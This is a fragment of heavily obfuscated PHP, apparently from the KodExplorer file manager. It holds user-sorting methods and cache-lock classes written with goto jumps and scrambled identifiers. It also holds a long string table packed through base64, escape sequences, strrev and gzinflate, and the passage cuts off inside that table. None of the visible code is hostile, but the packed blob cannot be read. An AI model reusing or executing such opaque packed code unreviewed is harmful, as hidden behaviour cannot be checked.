"\163\x6f\165\162\x63\x65") { $õ‘Æ¸°à =& $_SERVER[ì…™Î¶Ï]; $ÅòíÑîØ = array($õ‘Æ¸°à[1622] => USER_ID, $õ‘Æ¸°à[474] => 0, $õ‘Æ¸°à[414] => $ü²ÏÆ×¬, $õ‘Æ¸°à[413] => $†Õˆîßı); if ($this->where($ÅòíÑîØ)->find()) { return !1; } $ÅòíÑîØ = array($õ‘Æ¸°à[1622] => USER_ID, $õ‘Æ¸°à[474] => 0); $ÊÈşˆ‘ = $this->where($ÅòíÑîØ)->max($õ‘Æ¸°à[1822]); if (!$ÊÈşˆ‘) { $ÊÈşˆ‘ = 0; } if (!$…¯³Ò && $ü²ÏÆ×¬ == $õ‘Æ¸°à[408]) { $ĞÄ¾šê = Model($õ‘Æ¸°à[1301])->where(array($õ‘Æ¸°à[409] => $†Õˆîßı))->find(); if (!$ĞÄ¾šê) { return !1; } $…¯³Ò = $ĞÄ¾šê[$õ‘Æ¸°à[32]]; } $…¯³Ò = $this->getAutoName($…¯³Ò); $ÓöÈªğ = array($õ‘Æ¸°à[1622] => USER_ID, $õ‘Æ¸°à[474] => 0, $õ‘Æ¸°à[412] => $…¯³Ò, $õ‘Æ¸°à[413] => $†Õˆîßı, $õ‘Æ¸°à[414] => $ü²ÏÆ×¬, $õ‘Æ¸°à[1803] => $ÊÈşˆ‘ + 1); return $this->add($ÓöÈªğ); } protected function remove($Ğ’š‹¹) { $ŠøÔ·ìÂ =& $_SERVER[ì…™Î¶Ï]; $¦¾¦’¢„ = array($ŠøÔ·ìÂ[1622] => USER_ID, $ŠøÔ·ìÂ[411] => $Ğ’š‹¹); return $this->where($¦¾¦’¢„)->delete(); } protected function removeByName($—¼­¢ò«) { $²ïÔŞŸÕ =& $_SERVER[ì…™Î¶Ï]; $åŸêá¼± = array($²ïÔŞŸÕ[1622] => USER_ID, $²ïÔŞŸÕ[412] => $—¼­¢ò«, $²ïÔŞŸÕ[474] => 0); return $this->where($åŸêá¼±)->delete(); } protected function rename($„è†¸úÜ, $Ó¥«ßïª) { $Üšİ’¥” =& $_SERVER[ì…™Î¶Ï]; if ($„è†¸úÜ == $Ó¥«ßïª) { return !1; } $²Ÿ°š¹¡ = $this->getAutoName($Ó¥«ßïª); if ($Ó¥«ßïª != $²Ÿ°š¹¡) { return !1; } $í½µÚëƒ = array($Üšİ’¥”[1622] => USER_ID, $Üšİ’¥”[474] => 0, $Üšİ’¥”[32] => $„è†¸úÜ); return $this->where($í½µÚëƒ)->save(array($Üšİ’¥”[32] => $Ó¥«ßïª)); } protected function resetSort($¢ ùØç) { $­÷¶æÒ =& $_SERVER[ì…™Î¶Ï]; $¢ ùØç = is_array($¢ ùØç) ? $¢ ùØç : array(); $…˜§ƒÏÛ = array($­÷¶æÒ[1622] => USER_ID); for ($Åº¼®Ô = 0; $Åº¼®Ô < count($¢ ùØç); $Åº¼®Ô++) { $…˜§ƒÏÛ[$­÷¶æÒ[411]] = $¢ ùØç[$Åº¼®Ô]; $this->where($…˜§ƒÏÛ)->save(array($­÷¶æÒ[1803] => $Åº¼®Ô + 1)); } return !0; } protected function moveTop($ÄöáÆğâ) { $ïêâøƒÁ =& $_SERVER[ì…™Î¶Ï]; $÷½·¿„ = array($ïêâøƒÁ[1622] => USER_ID, $ïêâøƒÁ[474] => 0); $›ÜúÕïÃ = $this->where($÷½·¿„)->where(array($ïêâøƒÁ[32] => $ÄöáÆğâ))->find(); if (!$›ÜúÕïÃ) { return; } $ŠÖ°›Ô = $this->field($ïêâøƒÁ[392])->where($÷½·¿„)->order($ïêâøƒÁ[2227])->select(); $ŠÖ°›Ô = array_to_keyvalue($ŠÖ°›Ô, $ïêâøƒÁ[12], $ïêâøƒÁ[392]); $Ó¢÷®é» = $ŠÖ°›Ô; $ŠÖ°›Ô = array_remove_value($ŠÖ°›Ô, $›ÜúÕïÃ[$ïêâøƒÁ[392]]); array_unshift($ŠÖ°›Ô, $›ÜúÕïÃ[$ïêâøƒÁ[392]]); return $this->resetSort($ŠÖ°›Ô); } protected function moveBottom($Øò‡¿¾€) { $ıÅÛ€Çç =& $_SERVER[ì…™Î¶Ï]; $…‹å˜Îà = array($ıÅÛ€Çç[1622] => USER_ID, $ıÅÛ€Çç[474] => 0); $ÉùÁ»Èô = $this->where($…‹å˜Îà)->max($ıÅÛ€Çç[1822]); $”®¢ğ¤Î = array($ıÅÛ€Çç[1822] => $ÉùÁ»Èô + 1); return $this->where($…‹å˜Îà)->where(array($ıÅÛ€Çç[32] => $Øò‡¿¾€))->save($”®¢ğ¤Î); } private function getAutoName($ÆëÎò‰Ş) { $“±Ù©¼š =& $_SERVER[ì…™Î¶Ï]; $–Í’¥ù§ = array($“±Ù©¼š[1622] => USER_ID, $“±Ù©¼š[474] => 0); $ñÕ«¾¼ß = $this->field($“±Ù©¼š[32])->where($–Í’¥ù§)->select(); $ñÕ«¾¼ß = array_to_keyvalue($ñÕ«¾¼ß, $“±Ù©¼š[12], $“±Ù©¼š[32]); if (!$ñÕ«¾¼ß || !in_array($ÆëÎò‰Ş, $ñÕ«¾¼ß)) { return $ÆëÎò‰Ş; } for ($ñÙ×§™Œ = 0; $ñÙ×§™Œ < count($ñÕ«¾¼ß); $ñÙ×§™Œ++) { if (!in_array($ÆëÎò‰Ş . "\x28{$ñÙ×§™Œ}\x29", $ñÕ«¾¼ß)) { return $ÆëÎò‰Ş . "\x28{$ñÙ×§™Œ}\51"; } } return $ÆëÎò‰Ş . "\50{$ñÙ×§™Œ}\x29"; } } goto F÷¦×òÏ†ô; FëÙ´Õ¯: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $…ê³æ›á =& $_SERVER[ì…™Î¶Ï]; $‰¥€Æà˜ = $GLOBALS[$…ê³æ›á[6]][$…ê³æ›á[344]]; self::$cachePath = $‰¥€Æà˜[$…ê³æ›á[192]][$…ê³æ›á[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($­ÔÓöÖÕ, $¨ÊË¨ÜÃ = 0) { $‹¨™‹•ù =& $_SERVER[ì…™Î¶Ï]; $úŸ¸ç›¦ = microtime(!0); $Îı×Îğö = $úŸ¸ç›¦ + $¨ÊË¨ÜÃ + 0.0001; $‡¬ª‹¡Í = rtrim(self::$cachePath, $‹¨™‹•ù[8]) . $‹¨™‹•ù[834] . md5($­ÔÓöÖÕ) . $‹¨™‹•ù[831]; if (file_exists($‡¬ª‹¡Í) && filemtime($‡¬ª‹¡Í) && filemtime($‡¬ª‹¡Í) < time() - 10) { @unlink($‡¬ª‹¡Í); } do { if (file_exists($‡¬ª‹¡Í)) { cacheLockWait(); continue; } $ÓÚ¹úÌ· = fopen($‡¬ª‹¡Í, $‹¨™‹•ù[835]); if (!$ÓÚ¹úÌ·) { return !1; } $ÚœÜÎŞ = flock($ÓÚ¹úÌ·, LOCK_EX | LOCK_NB); self::$caches[$­ÔÓöÖÕ] = array($‹¨™‹•ù[836] => $ÓÚ¹úÌ·, $‹¨™‹•ù[192] => $‡¬ª‹¡Í); fwrite($ÓÚ¹úÌ·, $Îı×Îğö); clearstatcache(); if ($ÓÚ¹úÌ· && $ÚœÜÎŞ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Îı×Îğö); $this->unlock($­ÔÓöÖÕ); return !1; } public function lockGet($êßºìäØ) { $½Óñ£±Ã =& $_SERVER[ì…™Î¶Ï]; $öÃ§ø†– = rtrim(self::$cachePath, $½Óñ£±Ã[8]) . $½Óñ£±Ã[834] . md5($êßºìäØ) . $½Óñ£±Ã[831]; return file_exists($öÃ§ø†–); } public function unlock($›µî·¶Ì) { $Çõİ§ĞÌ =& $_SERVER[ì…™Î¶Ï]; $¥´ûˆîÖ = self::$caches[$›µî·¶Ì]; if (!$¥´ûˆîÖ) { return; } @flock($¥´ûˆîÖ[$Çõİ§ĞÌ[836]], LOCK_UN); @fclose($¥´ûˆîÖ[$Çõİ§ĞÌ[836]]); @unlink($¥´ûˆîÖ[$Çõİ§ĞÌ[192]]); unset(self::$caches[$›µî·¶Ì]); } } class CacheLockRedis { public function lock($ ô¯¶Ã¨, $ìº“ŠÊª = 10) { $áÆ¸İ– = Cache::init(); $ÆÀŸ©ÓÆ = microtime(!0) + $ìº“ŠÊª; while (microtime(!0) < $ÆÀŸ©ÓÆ) { $ßÎÉÎ² = $áÆ¸İ–->get($ ô¯¶Ã¨); if (!$ßÎÉÎ²) { $ò“››ò© = $áÆ¸İ–->setLock($ ô¯¶Ã¨, $ÆÀŸ©ÓÆ, $ìº“ŠÊª); if ($ò“››ò©) { return !0; } } else { if ($ßÎÉÎ² < microtime(!0)) { $áÆ¸İ–->set($ ô¯¶Ã¨, $ÆÀŸ©ÓÆ, $ìº“ŠÊª * 2); if ($áÆ¸İ–->get($ ô¯¶Ã¨) === $ßÎÉÎ²) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ï¿•‚áÏ) { return Cache::init()->get($Ï¿•‚áÏ); } public function unlock($âª²–³¸) { return Cache::init()->remove($âª²–³¸); } } class CacheLockMemcached { public function lock($Èõü’£Ê, $ü‡°ø‡‹ = 0) { $€øûäı = Cache::init(); $Ø·»…šÈ = microtime(!0) + $ü‡°ø‡‹; while (microtime(!0) < $Ø·»…šÈ) { $ÌÑ­İã = $€øûäı->get($Èõü’£Ê); if (!$ÌÑ­İã || $ÌÑ­İã < microtime(!0)) { $ÑÜÛ°³ = $€øûäı->handle->add($Èõü’£Ê, $Ø·»…šÈ, $ü‡°ø‡‹); if ($ÑÜÛ°³) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ØúìÎ‰–) { return Cache::init()->get($ØúìÎ‰–); } public function unlock($şùĞí¢à) { return Cache::init()->remove($şùĞí¢à); } } goto aìÂ¬Ğ¬Œ; b°‰Àµñ·÷: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('7IWZzrbP'), "\244\327\256\246\253\273"); $_SERVER[ì…™Î¶Ï] = explode(base64_decode('fAJ8A3wC'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXgb1bUwW1nLWghQKAwmie1Ei+3sTpxEtuVYRLYcSc5mG2U=')."\x24\x8d\xad\x89\x25\x8d\x3c\x33\xf2\x96\x4\xc2\x5e\xc2\xda\x2\x69\x80\xb0\xb5\xf\xca\x1a\xb6\xb2\x94\x0\x1\x4a\xa1\x94\xbd\x6c\x5\x5a\x68\x21\xe\xa1\x5\xfa\x2\x85\xb2\x94\xf2\xee"."\162\356\62\43\31\336\377\375\377\367\375\201\104\367\236\273\314\135\316\75\367\234\163\317\75\367\332\213\36\174\345\211\47\327\356\261\166\317\265\173\134\172\375\27\347\357\374".strrev('xææyËófz¿ãùú¾4{©·Wè¿ßí©ÿs:ÕUPÛÎÏänï·ŸÇÃG¾ÿ“'."\r".'')."\x7a\xfe\x3\x9b\xfb\x8e\xdb\xed\xa6\xc9\x9b\x1e\xa8\x47\x59\x69\xc9\x7a\xfa\xa3\xe4\xd\x5b\xd1\x86\x75\xcb\xb6\x28\x20\x65\xe4\x7b\xf5\x3e\x1a\xd6\xf3\xf4\xd7\x4f\x7f\x3a\xa3\x61\x53\xcb".base64_decode('GbZGoz76k+CtQv9aA1mdpSfaI/FErLOjIxiNQ6Z6OT1npCFUUE01B98vaKaFWiM=')."\127\227\50\30\5\55\357\200\10\100\132\265\325\244\152\101\115\315\215\211\346\140\107\70\262\42\21\137\321\21\204\34\311\304\100\121\63\107\150\214\4\143\266\152\332\161\75"."\247\361\34\103\46\157\127\143\160\121\250\135\211\107\3\355\261\100\123\74\24\151\247\340\246\110\133\133\50\136\12\217\106\302\341\306\100\323\342\322\224\216\150\140\121\133\100".base64_decode('Qe3Lagk932tUKatoyiqlmgZadC2bpsG8yppjjxQgFOchNE35YjZLI+08lNZ61WI=')."\26\106\253\131\216\24\114\75\247\262\116\57\326\106\70\224\6\324\242\155\350\371\24\215\4\207\155\123\25\160\324\326\24\232\150\55\17\125\305\202\341\140\123\134\301\15\124".base64_decode('WqKRNgUmIadatmYqy1qD0aCCG91QSfpaqQC+tKOhUALhsDJeDbaWK7BqaJkylUU=')."\242\315\301\250\322\270\102\21\43\224\62\162\71\43\357\103\265\240\231\264\245\246\6\243\121\32\360\0\172\207\103\170\322\40\22\151\151\211\5\171\14\72\267\44\214\132\62"."\15\360\323\21\113\367\146\355\304\240\232\55\62\64\355\247\277\225\360\3\277\206\5\250\73\240\347\365\42\240\51\124\141\30\174\131\101\240\310\162\153\14\242\245\41\220\103"."\345\15\130\171\150\31\16\322\140\303\174\372\73\27\62\45\23\70\115\63\355\204\226\117\31\151\75\17\213\165\1\40\235\152\147\232\115\35\145\200\232\14\137\312\50\214\264".base64_decode('GYPQi149q4X5Cus1smnNFPECKi6nQHf0Ual0ezEnZ+HRVEbPpk22ML8tJ1r6eu8=')."\210\130\200\226\121\64\123\132\10\55\21\121\266\203\267\244\26\62\151\266\215\172\153\261\176\165\26\262\206\232\216\151\246\324\327\26\124\60\122\264\145\140\221\144\153\61\314"."\x5c\x33\x22\x15\xf0\x7d\xb4\x4c\xf4\xce\x32\x9\xfd\x6c\xa1\xa4\xa5\x21\xf4\x57\x75\x9d\xe6\xfd\x4f\x4f\xd7\x42\xf4\x4f\x35\xd0\xc2\x6e\x68\x53\x46\xcb\x66\x13\xda\xb0\x6\x2b\x29\x97\x9e"."\141\261\116\372\255\244\236\367\43\10\215\206\42\211\214\152\145\332\322\63\22\244\24\43\261\151\155\330\127\310\24\140\231\363\225\335\355\300\164\74\55\355\206\35\224\10\165"."\326\110\251\131\271\213\64\234\261\355\102\114\313\247\361\110\100\127\214\241\74\31\251\202\246\101\246\146\217\222\126\332\224\25\112\153\275\136\157\261\202\271\54\17\261\336\161"."\230\305\201\366\60\240\112\5\120\214\102\41\253\247\124\133\67\362\176\43\145\153\266\327\262\115\115\205\334\201\124\112\263\54\157\223\221\267\115\43\353\15\144\263\306\220\67"."\142\352\175\172\276\136\231\2\224\25\45\242\25\354\305\324\256\36\226\145\305\134\5\43\1\136\362\123\32\212\166\257\167\66\133\156\74\267\251\346\255\136\315\364\6\141\31"."\324\53\150\274\71\311\143\331\232\165\253\140\130\72\156\136\275\242\332\266\232\312\140\162\41\252\157\140\64\260\240\233\232\305\276\257\54\152\213\103\105\250\204\346\355\60\325"."\xbe\x9c\x5a\xaf\x14\x8a\x49\xd4\x5b\x58\x6a\x65\x60\x34\x37\x74\xb7\x5e\x49\xe1\xa8\x47\xc9\x15\x2d\xdb\x6b\x6a\x88\x96\xe8\x68\xbf\x82\x79\x9\xf5\x7a\xdb\xf0\x3a\xd0\xb5\xb4\x37\x86\x48"."\x2e\x80\xa7\xd5\x4c\x57\xd0\x54\x2b\x2c\x8d\x42\x5b\xe3\xf1\x8e\x44\xa8\x5\xed\xa9\xed\xc1\x44\x5b\x20\xde\xd4\xa\xcd\xb6\xd5\x3e\xd6\xe6\x30\x22\xa4\xbc\x4a\x6\x5c\xee\x45\xeb\x1\x23"."\103\73\352\253\0\166\30\103\232\211\76\334\70\122\257\364\33\351\244\61\354\143\111\70\163\14\55\170\226\31\117\141\301\366\106\325\174\37\36\237\344\210\255\1\312\130\203"."\x7d\xce\xc1\xe\x6b\xf9\x3e\x3b\xc3\xa\xc6\x82\xd1\xa5\xc1\x68\x22\x16\x69\x89\x2f\xb\x44\x61\x37\xce\xa3\x99\x1f\x66\x9f\xc2\x55\x67\xbd\x51\x2d\x8d\x86\x3e\x65\xb3\x72\x6a\x1\x8f\x1a"."\xcb\x83\x91\x19\xcf\x15\x4b\xc5\x8\xce\xd2\xc2\xa1\x45\x78\x60\x9a\xbd\x16\xca\xe4\x95\x73\xb1\xba\xc3\x7a\x4e\xc7\x6d\xb7\x79\xa\x19\x49\xb4\x55\x2f\x82\x6\xf9\x49\x87\x1a\xba\x33\x53"."\252\272\323\123\253\275\350\337\51\325\135\335\315\276\51\75\13\374\272\50\343\257\365\325\52\165\65\63\225\16\304\73\350\152\126\201\116\227\344\250\121\42\213\235\303\42\60"."\x34\x6f\xe4\xb5\x6f\x19\x1c\xbc\xf9\x48\xcb\xd4\x35\xac\xc0\x6f\x4\x97\x74\x6\x63\xf1\x44\x5b\x30\xde\x1a\x69\x86\xaf\x7\x3\x10\xa\x1b\x74\x29\xb2\xde\x76\xd1\x9f\x1e\x9f\x20\xac\x8"."\37\102\71\265\317\105\156\161\254\315\60\65\47\104\220\377\145\172\232\321\143\34\155\325\364\276\14\364\135\307\265\245\214\254\141\252\131\114\225\30\202\153\214\122\364\351\275"."\60\167\224\0\212\110\114\317\25\30\235\262\63\305\134\122\12\2\245\265\20\56\260\175\42\143\360\175\312\60\41\124\357\207\214\223\352\132\30\245\365\307\246\241\377\5\131"."\x4d\x1b\x39\x95\x31\xb3\x84\x4\x69\x69\x4a\x83\x28\x68\x8a\x23\xa5\x55\x53\xc5\xc6\x67\x9b\xb6\x81\xa1\xa6\x23\x4b\x9b\x66\x67\xc\x98\xa4\x3e\x8d\x35\xa9\xc8\xdb\xc6\x5a\x99\xd6\xb2\x1a"."\x1b\x8d\x8c\xc6\x48\x74\xd\x64\x43\x5b\xc\x1f\xab\x5e\x4e\xae\x11\xeb\x85\xa0\x62\x6f\xd4\xad\x28\x2a\x89\x59\x21\x16\x5f\x86\x79\x55\x1\xb0\x79\xd6\x2c\xda\x1d\x22\xc9\xd5\x68\x29\xd1".base64_decode('eEK3WqRdPGGQNNR4VeTvMLVeHRZkHs1Ym2r2swJohsQ2giNSZS2d4XCiKdIeR/w=')."\57\205\54\213\206\342\101\206\243\201\346\104\240\251\203\157\212\142\306\41\3\46\46\245\324\237\102\6\353\240\143\250\71\176\261\5\41\352\134\60\362\226\346\115\101\11\301".base64_decode('J5ckpQXVB5oiKL+L8A971dyoN4cGxcsb6twflbi8zYZgFgUhx8OIRBi2MXdEYlA=')."\140\1\206\42\246\47\251\231\360\261\216\116\110\312\111\30\264\50\10\300\375\331\136\253\2\313\23\130\26\143\104\270\210\362\233\372\250\52\272\264\200\265\207\165\44\227\25"."\x7c\x9c\xb3\x57\x5e\x31\xf2\xf1\xd6\x50\xfb\xe2\x44\x5b\xa4\x39\x18\x4e\x84\xda\x11\x15\x8a\x97\xc2\x3b\x3b\x9a\x3\x6c\x2a\x65\x78\x63\x24\xde\xea\x80\x76\x22\x3a\xb4\x34\x10\xe\xb9\xb3".strrev('şg~Y7,^‰"'."\r".' {O"­Mš%n(Khó–„¶'."\r".'ÖÔRºë$ÙXñb‡—').base64_decode('BCKoMS59JQaxJMkGK+EQeBKMlU8IHEIbpwaYBt3F8ivpCUivKaPIyD1n8nKMhuQ=')."\124\130\104\52\333\24\253\350\117\265\22\210\51\166\41\301\251\105\162\204\7\111\67\130\34\261\163\360\175\5\210\173\111\13\22\70\117\243\326\313\351\164\171\100\240\327\346"."\153\336\25\107\310\57\322\320\14\4\210\240\214\60\201\314\10\174\106\107\113\311\264\3\254\71\275\102\110\115\104\220\64\37\300\42\156\142\131\64\322\276\10\12\14\145\64"."\326\200\20\14\177\25\143\244\100\322\265\5\301\102\134\220\12\153\45\47\6\175\265\301\206\162\55\375\231\114\177\20\123\7\37\327\362\154\324\223\230\166\263\335\207\5\172".strrev(''."\0".'R6cE˜`Ø8²<GûÙS5#0É!‹jò’àÁ8â)ÖË#'."\r".'%¯ò(×t`jÑ')."\x92\x3d\x23\x51\x18\x10\xdb\xe8\x67\x72\x10\x4d\x8c\x6\x63\x6c\x95\x9b\xda\x40\x51\x67\xc3\xe5\xf7\x4d\x5\x2c\xd6\xd0\x16\x5\x9f\xf7\x9f\xdc\x3d\x34\xb5\xaa\xcb\x3b\xd5\xd7\x83\x2\xd5"."\x53\x16\xd2\x28\xc4\xba\x7d\x8e\xe8\x44\x28\x5f\x34\x79\x69\xcc\x22\x55\x59\xb\xaa\xeb\xbb\xfd\xdd\xfe\xaa\x5\xf5\x5d\x1\xef\xa8\xea\x1d\xad\xf1\xce\xf1\xf6\x4c\xed\xf6\x55\x4f\x5\x40"."\xcf\x9a\x3a\xcf\xf4\x75\x38\x3\xca\xb8\xe0\xc4\x1e\xf4\xd3\xd0\xbd\x60\x52\xb7\x77\xf2\x29\xab\x16\x76\x75\xf7\x54\xd6\x4f\x3d\xa1\xdb\x77\x62\xf7\x50\xcf\x94\xea\x5\xec\x3b\xa9\xa2\x89"."\x64\xbc\xd4\x8\x6f\x6a\x7a\x6a\x15\x6a\x12\x62\x9d\x78\x96\x3c\x21\x79\x52\x6\x96\x30\xaa\x17\x4\x74\xcd\xcc\x75\xc\x8e\xe6\x50\xeb\x13\x25\xba\xbc\xdd\x53\x7b\x16\x48\xe5\x24\x90\xfb".strrev('¿¢L×ØäíP¹óÚ—Ï/½ĞÕ$]x ”ùŠ?î¼QxÏq+¼óÃ7ôB5ˆ[')."\353\330\104\366\151\303\214\64\344\173\165\23\260\263\230\327\7\230\316\40\257\15\100\300\260\31\176\47\65\173\110\143\350\201\340\216\70\102\16\46\326\241\44\51\226\45\114"."\40\174\1\13\104\34\107\71\62\351\205\4\346\300\206\170\54\255\345\141\236\366\203\334\126\112\55\150\61\251\207\211\104\74\320\30\16\46\30\205\1\112\314\342\204\52\66".strrev('¯˜i[y «cG ¦ë0*Ñª‰ë0ÓLÑA„!V@ÖùX$N»¤>Œ¨ šêır')."\320\41\207\162\11\171\2\12\52\343\23\260\44\254\211\105\217\51\24\264\251\40\146\310\102\14\27\343\176\374\125\335\335\305\56\55\335\323\205\20\137\365\366\366\254\231\266"."\256\232\161\364\376\156\364\207\105\2\145\224\136\11\116\15\23\150\177\366\341\166\160\365\205\43\302\223\151\324\60\71\213\124\160\60\331\266\141\253\131\107\25\161\14\141\244"."\211\155\334\40\360\323\331\16\13\212\205\267\162\111\133\110\310\151\73\127\210\161\275\205\244\256\302\45\142\232\355\343\71\74\122\142\2\305\35\232\333\206\12\106\354\363\150".base64_decode('OTVJWx1Vu8RGLFvLOVSMlqaaqUxLMZu1Oauf1fvhC7BWVpXL22KYTNydAt+tmFI=').base64_decode('LmMon0fCqYxbYlddFED8S1ypYuo4JdSuNEYi4WCgXcEbOGw8iDuIBTsCaNfCgnM=')."\54\36\4\15\141\250\331\313\352\135\356\15\201\370\304\3\172\232\315\23\42\166\66\203\202\236\12\142\230\211\364\140\315\214\7\163\21\36\324\134\17\26\215\74\202\203\367"._kodDe('KDv+XY3NRj58KXYUyKXWrDMYYPZctikCBnEroWr+j9oFGvkrf8S+k1ZMPOcTvMZ7')."\265\101\55\353\141\115\363\260\26\173\30\363\357\41\302\134\63\64\253\23\55\34\150\26\11\42\372\230\361\140\124\301\230\352\21\212\70\370\234\44\155\170\204\44\342\351\63".base64_decode('jWKhg31JitHGAEC0lAOihmF7mHTpKRU8y49d+aaTwXZ/GyYKJ5UOyXfMTOngOwU=')."\xa8\x35\xb4\x46\x10\xc4\xd7\xb1\xcd\xcb\x91\x47\xcc\x25\x5b\x4f\x59\x4d\xc4\xf0\x68\x8b\xd0\x52\xb1\x1e\x71\x87\x5a\xd4\x41\x19\xcd\xca\xa1\x1c\xdb\x42\x18\x7a\xa\x95\xb8\x50\xdc\xa\x96"."\xd6\x2d\x4a\xba\xd5\xae\xf8\xa3\x71\xb5\x2f\x26\x7d\xce\x56\xfb\xd8\xb7\xca\xa4\xd2\x70\x54\x4b\x8d\xa4\x84\x38\xda\x2c\x9\xb9\xce\x18\x9f\x0\xb2\x52\xca\x61\x79\xf9\x89\xe5\x98\xcb\xe7"."\141\377\375\366\143\3\311\320\231\117\252\143\25\174\367\372\203\236\20\162\26\51\10\206\200\66\26\223\324\30\332\240\132\262\52\354\100\165\162\62\20\123\217\63\206\227\217"."\x8f\x10\x57\x72\x46\x11\xe3\xba\x89\x70\xb0\x25\xae\x9c\x14\x41\x84\x49\x37\x12\xb4\x4c\x2\x67\x56\xc8\x3f\x46\x5e\x71\xd4\xcd\x86\x4b\x69\x20\xe9\x22\xae\xe6\xd3\x14\xb2\xa\x51\xed\x55".base64_decode('DRXsIxWO4gIXnI3wsKhSil14uOVBwPsQ6b7YaRgoIja2InBxqpWiAaxihpDGYGI=')."\152\145\344\43\363\353\6\260\166\71\276\213\243\142\341\60\224\120\360\7\74\22\337\201\311\207\127\54\1\51\12\77\316\221\167\41\246\153\127\304\43\325\241\347\107\364\274"."\254\230\22\120\261\261\212\175\35\57\144\227\52\255\171\274\60\335\55\204\342\313\3\12\61\117\126\317\367\113\173\256\320\272\240\326\343\242\122\333\241\46\127\313\31\45\205".base64_decode('TnciwT7hWsiA+BnVFGPKKA5e9kLdh7OIqJStVx0UPIejjEQ3LHuEtV4OOiul0eY=')."\361\42\255\134\137\121\56\52\223\44\335\12\243\261\53\27\46\75\215\33\145\243\130\147\306\302\6\301\177\253\334\176\117\44\376\52\6\3\206\42\41\351\1\70\245\162\226"."\243\15\14\160\142\217\230\364\54\332\342\114\37\136\114\213\360\216\45\157\26\234\270\133\170\167\224\61\64\246\241\125\4\20\121\133\254\44\115\316\55\164\100\170\43\20\33"."\x7\x1b\x79\xb1\x2e\xc5\x6c\x88\x45\xe8\x40\x9c\x3e\xd1\xd2\x22\xca\x91\x28\x6d\x14\x46\xfe\xf2\xf1\x16\xd3\xe0\xac\x2e\xe7\x3\xdc\x99\x9a\x88\x2c\x69\xcb\x43\x2f\x6d\xe2\xd2\x40\x39\xf8"."\x8d\x12\x90\x54\xc6\xcd\x79\xb8\xa0\xae\xa8\x7b\xbc\x61\xab\xa2\x20\xa6\x57\x56\xd3\x39\x3d\xef\x33\xe9\xa6\xe7\x43\x12\x2\x9c\xf1\x7a\x6a\x24\x96\x4c\x50\xaa\x35\x16\xd9\x5a\x60\x93\x5c"."\xe7\x42\x0\xdb\x30\x90\xd8\x69\xfa\x4c\xf4\x65\xd1\x20\x60\xfa\x8b\x7c\x1a\x7a\xa0\x55\xa4\x2a\x91\x4f\x22\x96\x24\x25\x6c\x30\x1\x16\xaf\xff\x60\x5a\xb7\x31\x4\xef\x72\x6\x53\x46\x8b"."\214\322\161\53\207\311\324\227\154\42\45\223\40\30\172\317\44\107\316\162\133\275\157\12\331\235\175\345\117\221\361\71\64\15\111\326\26\71\176\60\115\200\76\313\66\12\42"."\105\212\322\144\51\111\124\52\345\342\3\115\332\201\120\75\115\370\127\61\120\44\57\224\45\302\55\135\115\276\54\312\41\35\222\204\232\3\246\311\320\207\166\16\353\315\21"."\120\6\141\272\24\143\270\137\156\243\241\225\7\7\205\55\5\255\12\177\330\107\127\242\117\115\247\43\354\124\110\16\227\146\225\25\175\345\53\42\206\55\274\52\51\126\76"."\173\40\233\25\147\337\356\370\270\105\350\242\223\13\311\220\161\213\265\20\311\222\235\155\225\203\161\231\103\146\250\235\14\264\260\104\160\63\332\116\132\72\76\367\61\16\261".base64_decode('ERNaPo526qaMntcsvuGaVjna8f+ZzS2dA7xWxkMcnCYph7F116Bjd+UaUEGaJAY=')."\202\154\306\11\333\301\372\104\111\35\322\342\161\340\3\132\254\264\317\170\173\10\105\320\142\54\217\241\356\174\32\323\1\23\72\67\314\267\70\271\20\302\50\314\67\215\127"."\47\113\346\125\11\46\353\215\73\356\176\162\327\172\32\76\373\303\47\337\370\347\26\230\163\315\322\7\163\120\327\64\372\263\166\257\265\273\243\377\110\130\130\337\235\265\174"."\304\170\367\211\43\26\255\77\345\342\266\301\327\12\177\152\335\350\375\242\43\166\344\324\277\337\241\75\375\252\276\346\242\336\163\117\230\163\151\346\300\71\57\27\156\374\315"."\353\247\116\310\135\362\354\361\325\121\373\0\373\274\11\37\376\374\173\53\257\175\66\277\176\302\176\77\275\366\355\33\346\177\354\255\337\176\354\304\261\142\362\250\35\17\316"."\x32\x7a\xdf\x5a\xf3\xc9\x9a\x27\x67\x7f\xb5\x7d\x51\xe4\xad\xd1\x8f\x97\x1e\xaf\xfe\xe8\xda\x83\x8e\xfd\xde\xb\xbf\x5c\xf1\xa3\x95\x9b\x16\xce\x9f\x76\xc0\xce\x9a\xfb\x56\xbc\xb0\xec\x93".base64_decode('OY/MeeST+tOefvK4/b8cXH3rDZ+/vbRx1ZHvnnD8kuS/vrq4UFHsnrA83r5+fbI=')."\xe2\xbe\x4b\xae\x3c\xb6\xf8\xc3\xbd\xea\x37\x3d\xb6\xe9\xf1\xd3\x56\xfe\xe1\xa6\x7b\x2f\xba\xf9\xcf\x57\xf\xbe\x7c\x93\xf5\xc4\x5d\x1f\x5e\x51\xb8\xe2\xd3\xbd\xdf\xba\x6b\xd5\xbc\xdf\x6b".base64_decode('GxRr6e/n/fuLuz579KfpT54P3P3YPn8+7puNv9917Vvztr97VYu19eUXfnrrI+c=')."\114\234\173\357\137\47\236\327\260\72\365\132\144\305\21\217\334\175\350\156\365\177\254\312\336\132\271\375\320\336\207\337\337\373\354\335\327\135\163\367\213\57\314\173\351\274\263"."\x7e\x7e\xe7\x5d\xf7\x6e\xfc\xe7\xea\x8d\xa7\xfe\xf0\xde\x48\xff\xcc\xe8\x8e\x95\x1f\xfd\xf1\x8e\x8f\x47\xd6\xc5\x12\x47\x7e\xb5\x74\xe5\xbe\xcf\x28\x7f\xcd\x3f\xdf\x98\x5a\xff\xaf\xc7\x5f"."\375\372\116\343\210\217\353\177\367\376\324\215\167\14\354\210\355\234\176\342\272\71\117\136\64\373\234\107\116\13\75\260\307\272\63\136\362\235\331\73\262\333\5\352\321\127\66".base64_decode('Pv7f575S8cH87085fO+HFzz6+Ad7tf549gs